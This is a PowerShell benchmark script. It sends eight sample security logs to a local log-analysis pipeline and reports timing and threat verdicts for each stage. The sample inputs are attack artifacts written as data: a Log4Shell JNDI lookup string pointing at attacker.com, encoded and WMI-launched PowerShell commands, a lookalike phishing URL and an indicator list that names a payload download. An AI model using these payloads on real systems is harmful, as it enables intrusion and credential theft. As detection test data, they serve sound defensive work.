# RECON pipeline benchmark — sends a representative log mix through /api/analyze/sync
# and reports per-stage timing + overall averages.

$logs = @(
    @{
        name = "SentinelOne RMM detection"
        text = "EventLog Description : SentinelOne Message : Malware detected! Name: ScreenConnect.ClientSetup.exe Path: C:\Windows\SystemTemp\ScreenConnect\24.2.10.8991\ScreenConnect.ClientSetup.exe Detection engine: windows.reputation"
    }
    @{
        name = "Phishing email (lookalike domain + URL)"
        text = "From: noreply@login.microsoftonline.com.fake-domain.top`nTo: cfo@acmecorp.com`nSubject: Urgent: Verify your account`nClick here: https://login.microsoftonline.com.fake-domain.top/oauth/authorize?client_id=abc"
    }
    @{
        name = "Active-exploitation CVE"
        text = "Apache web server log: GET /api/v1/check?cmd=`$%7Bjndi:ldap://attacker.com:1389/exploit%7D - related to CVE-2021-44228 from 185.220.101.45 - User-Agent: Mozilla/5.0"
    }
    @{
        name = "C2 callback (IP + domain + hash)"
        text = "Sysmon: process powershell.exe -enc JABjAGwAaQBlAG4AdAA= connected to 45.142.213.99:443 - DNS resolved api.suspicious-cdn.tk - file hash 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
    }
    @{
        name = "Bulk IOC paste (TI report dump)"
        text = "IOCs from APT41 campaign:`n185.220.101.45`n45.142.213.99`n203.0.113.42`napi.suspicious-cdn.tk`nmalicious-update.xyz`nfake-microsoft-login.top`nd41d8cd98f00b204e9800998ecf8427e`n098f6bcd4621d373cade4e832627b4f6`nhttps://evil.example.com/payload.exe"
    }
    @{
        name = "Failed-login burst (log content, no IOCs)"
        text = "Windows Security 4625: failed logon for user 'admin' from source IP 198.51.100.42 - 47 attempts in last 60 seconds - LogonType: 3 (Network) - Status: 0xc000006d - SubStatus: 0xc000006a"
    }
    @{
        name = "LotL / PowerShell + WMI"
        text = "Process tree: explorer.exe -> cmd.exe -> powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc <base64> | wmic /node:dc01.corp.local process call create 'powershell.exe -enc ...'"
    }
    @{
        name = "Benign-looking (Cloudflare)"
        text = "GET /api/v1/users HTTP/2 200 - 1.1.1.1 - 8.8.8.8 - User-Agent: legitimate-api-client/1.0 - Response time 23ms"
    }
)

$results = @()

foreach ($lg in $logs) {
    Write-Host ("--- {0,-44} ---" -f $lg.name)
    $body = @{ logText = $lg.text; inputType = "log" } | ConvertTo-Json
    $sw = [System.Diagnostics.Stopwatch]::StartNew()
    try {
        $r = Invoke-RestMethod -Uri "http://localhost:8000/api/analyze/sync" -Method POST `
              -Body $body -ContentType "application/json" -TimeoutSec 180
        $sw.Stop()
        $total = $sw.Elapsed.TotalSeconds

        $stages = @{}
        foreach ($t in $r.agent_trace) {
            $stages[$t.agent] = $t.elapsed_ms
        }
        $threat = $r.response_summary.threat_level
        $skipped = ($r.agent_trace | Where-Object { $_.ai_skipped }).Count -gt 0

        Write-Host ("  total={0,5:N1}s  triage={1,5}ms  enrich={2,7}  invest={3,7}  resp={4,7}  verdict={5}{6}" -f `
            $total,
            ($stages['triage']),
            $(if ($stages.ContainsKey('enrichment')) { "$([int]$stages['enrichment'])ms" } else { "skip" }),
            $(if ($stages.ContainsKey('investigation')) { "$([int]$stages['investigation'])ms" } else { "skip" }),
            $(if ($stages.ContainsKey('response')) { "$([int]$stages['response'])ms" } else { "skip" }),
            $threat,
            $(if ($skipped) { "  [fast-path]" } else { "" }))

        $results += [PSCustomObject]@{
            Name       = $lg.name
            TotalSec   = $total
            TriageMs   = $stages['triage']
            EnrichMs   = $stages['enrichment']
            InvestMs   = $stages['investigation']
            RespMs     = $stages['response']
            Verdict    = $threat
            FastPath   = $skipped
        }
    } catch {
        $sw.Stop()
        Write-Host ("  ERROR after {0:N1}s : {1}" -f $sw.Elapsed.TotalSeconds, $_.Exception.Message)
    }
}

if ($results.Count -gt 0) {
    Write-Host ""
    Write-Host "═══════════════════ AVERAGES ═══════════════════"
    $total = ($results.TotalSec  | Measure-Object -Average).Average
    $tri   = ($results.TriageMs  | Where-Object { $_ } | Measure-Object -Average).Average
    $enr   = ($results.EnrichMs  | Where-Object { $_ } | Measure-Object -Average).Average
    $inv   = ($results.InvestMs  | Where-Object { $_ } | Measure-Object -Average).Average
    $res   = ($results.RespMs    | Where-Object { $_ } | Measure-Object -Average).Average
    Write-Host ("  Mean total              : {0,6:N1} s" -f $total)
    Write-Host ("  Mean triage             : {0,6:N0} ms" -f $tri)
    Write-Host ("  Mean enrichment         : {0,6:N0} ms" -f $enr)
    Write-Host ("  Mean investigation      : {0,6:N0} ms" -f $inv)
    Write-Host ("  Mean response           : {0,6:N0} ms" -f $res)
    Write-Host ""
    $fp = ($results | Where-Object { $_.FastPath }).Count
    Write-Host ("  Triage fast-path hits   : {0} / {1}" -f $fp, $results.Count)
    Write-Host ("  Verdicts                : {0}" -f (($results.Verdict | Group-Object | ForEach-Object { "$($_.Name)=$($_.Count)" }) -join ", "))
}
